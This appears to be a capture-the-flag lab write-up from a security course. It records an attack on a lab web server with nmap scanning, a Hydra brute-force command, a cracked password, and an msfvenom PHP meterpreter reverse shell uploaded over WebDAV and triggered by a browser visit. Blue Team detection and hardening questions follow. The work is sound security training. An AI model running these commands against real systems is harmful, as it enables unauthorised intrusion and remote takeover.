### Presentation

PLACEHOLDER LINK

### Day 1 Deliverables

Complete the following to find the flag:

- Discover the IP address of the Linux web server.
> Run ```nmap 192.168.1.0/24```

![1-network-discovery](screenshots/1-network_discovery.png)

- Locate the hidden directory on the web server.
> Navigate to http://192.168.1.105:80, explored the server contents with a browser.

![2-website](screenshots/2-website.png)
![3-secret-folder](screenshots/3-secret-folder.png)

- Brute force the password for the hidden directory using the hydra command:
> Find the wordlist and unzip the package.

![4-rockyou-find](screenshots/4-rockyou-find.png)
![5-unzip-rockyou](screenshots/5-unzip-rockyou.png)

> Ran Hydra with the following command ```hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder```, logged into the website.

![6-hydra-bruteforce](screenshots/6-hydra-bruteforce.png)
![7-secret-folder-contents](screenshots/7-secret-folder-contents.png)

- Break the hashed password with the Crack Station website or John the Ripper.
> Read the contents of the secret folder and cracked the HASH password with John the Ripper. The cracked password is ```linux4u```.

![8-webdav-contents](screenshots/8-webdav-contents.png)
![9-john-the-ripper](screenshots/9-john-ripper.png)

- Connect to the server via WebDav.
> Connected to the WebDav service at ```192.168.1.105/webdav```.

![10-webdav_passwd](screenshots/10-webdav_passwd.png)

- Upload a PHP reverse shell payload.
> Created the payload with ```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=4444 -f raw > meterpreter.php``` followed by uploading it with ```cadaver http://192.168.1.105/webdav``` and ```put meterpreter.php```.

![11-msfvenom](screenshots/11-msfvenom.png)
![12-cadaver](screenshots/12-cadaver.png)
![13-metasploit](screenshots/13-metasploit.png)

- Execute payload that you uploaded to the site to open up a meterpreter session.
> Payload executed by going to http://192.168.1.105/webdav/meterpreter.php.

![14-payload](screenshots/14-payload.png)

- Find and capture the flag.
> Ran ```locate flag```, followed by ```head /flag.txt```

![15-locate_flag](screenshots/15-locate_flag.png)
![16-flag](screenshots/16-flag.png)

### Day 2 Deliverables

1. Identify the offensive traffic.
   - Identify the traffic between your machine and the web machine:
     - When did the interaction occur?
     - What responses did the victim send back?
     - What data is concerning from the Blue Team perspective?

2. Find the request for the hidden directory.
   - In your attack, you found a secret folder. Let's look at that interaction between these two machines.
     - How many requests were made to this directory? At what time and from which IP address(es)?
     - Which files were requested? What information did they contain?
     - What kind of alarm would you set to detect this behavior in the future?
     - Identify at least one way to harden the vulnerable machine that would mitigate this attack.

3. Identify the brute force attack.
   - After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:
     - Can you identify packets specifically from Hydra?
     - How many requests were made in the brute-force attack?
     - How many requests had the attacker made before discovering the correct password in this one?
     - What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?
     - Identify at least one way to harden the vulnerable machine that would mitigate this attack.

4. Find the WebDav connection.
   - Use your dashboard to answer the following questions:
     - How many requests were made to this directory? 
     - Which file(s) were requested?
     - What kind of alarm would you set to detect such access in the future?
     - Identify at least one way to harden the vulnerable machine that would mitigate this attack.

5. Identify the reverse shell and meterpreter traffic.
   - To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:
     - Can you identify traffic from the meterpreter session?
     - What kinds of alarms would you set to detect this behavior in the future?
     - Identify at least one way to harden the vulnerable machine that would mitigate this attack.
